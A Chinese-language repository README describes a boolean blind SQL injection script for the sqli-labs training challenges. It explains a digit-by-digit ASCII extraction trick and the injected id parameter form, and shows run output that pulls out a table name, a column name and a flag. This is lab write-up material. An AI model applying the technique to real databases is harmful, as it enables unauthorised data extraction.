# some_scripts
some common-used scripts
一些常用的脚本

# boolean_sqli_exp.py
sqli-lab less60之后的盲注脚本
*注入原理*
0. MYSQL提供字符串切片操作，如
```sql
# mysql> select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));
# +------------+------------------------------------+------------------------------------+
# | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |
# +------------+------------------------------------+------------------------------------+
# |         49 | 4                                  | 9                                  |
# +------------+------------------------------------+------------------------------------+
```

1. id=1到id=12都有值，且值不同；可参考源码中的`["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"]`，因此可根据页面内容反推id， 例如当页面出现admin2，就知道id=9

2. 因此，使用分段带出ascii码值的方式注入，即将每一个字符的ascii值分成百位、十位、个位，每一位范围都是0~9，记为QUERY_ID

3. 当请求`id=('') or id=(QUERY_ID)`，数据库会执行注入的查询语句，我们可根据页面的回显确定QUERY_ID是多少，即字符ascii值的每一位数字是多少。

4. 本方法降低运算量至3次。实际上，本关130次的限制是怎么来的呢？
```markdown
表名：len('P79FGLN0JK') = 10， 
列名：len('secret_Y1P6')= 11，
flag：len('uwpeCvsrLcadsa8P7wSn9Ix4') =24*
访问次数 = (10+11+24)x3 = 125 < 130
```
所以，我更加确定这是作者想要我们使用的方法
5. 附录常见注入算法的复杂度
-----------------
|算法|复杂度|
|逐位比较|理论128次|
|位运算|理论8次|
|二分法|理论8次|
|本方法|理论3次|
-----------------

我们一位、一位地跑出结果，以获取得到第*3*位字母'c'为例，其十进制的ascii值
利用ascii(substring(query,*3*,1))中，
*运行结果*
```
markdown
boolean_sqli_exp.py'
[-]current content is:L
[-]current content is:LR
[-]current content is:LR2
[-]current content is:LR20
[-]current content is:LR20P
[-]current content is:LR20PA
[-]current content is:LR20PAL
[-]current content is:LR20PALH
[-]current content is:LR20PALHC
[-]current content is:LR20PALHCD
[-]table_name is:LR20PALHCD
[-]current content is:s
[-]current content is:se
[-]current content is:sec
[-]current content is:secr
[-]current content is:secre
[-]current content is:secret
[-]current content is:secret_
[-]current content is:secret_D
[-]current content is:secret_DO
[-]current content is:secret_DOY
[-]current content is:secret_DOYB
[+]column_name is:secret_DOYB
[-]current content is:J
[-]current content is:Jl
[-]current content is:Jll
[-]current content is:Jll9
[-]current content is:Jll98
[-]current content is:Jll98P
[-]current content is:Jll98PQ
[-]current content is:Jll98PQ8
[-]current content is:Jll98PQ8U
[-]current content is:Jll98PQ8Uy
[-]current content is:Jll98PQ8Uyk
[-]current content is:Jll98PQ8Uyka
[-]current content is:Jll98PQ8Uykak
[-]current content is:Jll98PQ8Uykakv
[-]current content is:Jll98PQ8Uykakvp
[-]current content is:Jll98PQ8Uykakvpy
[-]current content is:Jll98PQ8Uykakvpyc
[-]current content is:Jll98PQ8Uykakvpyc9
[-]current content is:Jll98PQ8Uykakvpyc9S
[-]current content is:Jll98PQ8Uykakvpyc9SP
[-]current content is:Jll98PQ8Uykakvpyc9SPs
[-]current content is:Jll98PQ8Uykakvpyc9SPst
[-]current content is:Jll98PQ8Uykakvpyc9SPstP
[-]current content is:Jll98PQ8Uykakvpyc9SPstPB
[+]FLAG is:Jll98PQ8Uykakvpyc9SPstPB
```
